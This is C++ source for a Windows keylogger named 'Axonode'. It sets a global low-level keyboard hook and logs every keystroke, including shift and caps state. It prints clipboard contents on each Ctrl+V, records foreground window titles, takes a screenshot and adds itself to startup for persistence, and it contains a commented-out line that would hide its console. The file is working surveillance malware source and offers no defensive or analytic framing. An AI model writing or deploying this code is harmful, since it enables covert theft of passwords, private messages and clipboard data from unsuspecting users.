#include "stdafx.h"
#include <windows.h>
#include "axonUtil.h"
#include <string>
#include <sstream>
#include <iostream>
#include <cstdio>
using namespace std;


HHOOK hKeyboardHook;
int isCaps = 0;
#pragma region Kelogging
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	DWORD SHIFT_key = 0;
	unsigned int vCode[61] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
	0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x6A, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0xBC, 0xBD, 0xC0, 0xBE, 0xBB,
	0x08, 0x0D, 0x20, 0xDE, 0xBF, 0xDB, 0xDD, 0xBA, 0x09};
	string lowCase[61] = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
	"t", "u", "v", "w", "x", "y", "z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ",", "-", "`", ".", "=", "\b \b", "[ENTER] \n", " ", "'", "/", "[", "]", ";",
	"[TAB] \t"};
	string upCase[61] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
	"T", "U", "V", "W", "X", "Y", "Z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "<", "_", "~", ">", "+", "\b \b", "[ENTER] \n", " ", "\"", "?", "{", "}", ":",
	"[TAB] + [SHIFT] \t" };

	if ((nCode == HC_ACTION) && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
	{
		if (isCaps == 1)
		{
			if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
			{
				cout << " [CAPS OFF] ";
				isCaps = 0;
			}
		}
		else
		{
			if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
			{
				cout << " [CAPS ON] ";
				isCaps = 1;
			}
		}		
	}

	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

		for (int i = 0; i < ( sizeof(vCode) / sizeof(vCode[0]) ); i++)
		{
			if (p->vkCode == vCode[i])
			{
				if (isCaps == 1)
				{
					if (GetAsyncKeyState(VK_SHIFT) >= 0)
						cout << upCase[i];
					else
						cout << lowCase[i];
				}
				else
				{
					if (GetAsyncKeyState(VK_SHIFT) >= 0)
						cout << lowCase[i];
					else
						cout << upCase[i];
				}

				if ((GetAsyncKeyState(VK_CONTROL) != 0) && p->vkCode == 0x56)
				{
					cout << "\b \b";

					if (!OpenClipboard(NULL))
						cout << "Can't open clipboard" << endl;

					cout << "\n[CLIPBOARD PASTE]:\n";

					HANDLE h = GetClipboardData(CF_TEXT);

					printf("%s\n", (char *)h);

					CloseClipboard();
				}
				else if((GetAsyncKeyState(VK_CONTROL) != 0))
					cout << "\b \b[Control] + " << lowCase[i] << "\n";
			}
		}

	}
	return(CallNextHookEx(NULL, nCode, wParam, lParam));
}
#pragma endregion

#pragma region ActiveWindow
VOID CALLBACK WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	if (dwEvent == EVENT_SYSTEM_FOREGROUND)
	{
		cout << "\n [WINDOW CHANGE] \n";
		cout << getWindowTitle() << endl << endl;
	}
}

#pragma endregion

int main()
{	
	MSG msg;
	if (getStartup(L"Axonode") == FALSE)
		addStartup();
  
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
	getScreenShot();

	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	HWINEVENTHOOK hEvent = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
		WinEventProcCallback, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);

	while (!GetMessage(&msg, NULL, NULL, NULL)) 
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
    return 0;
}

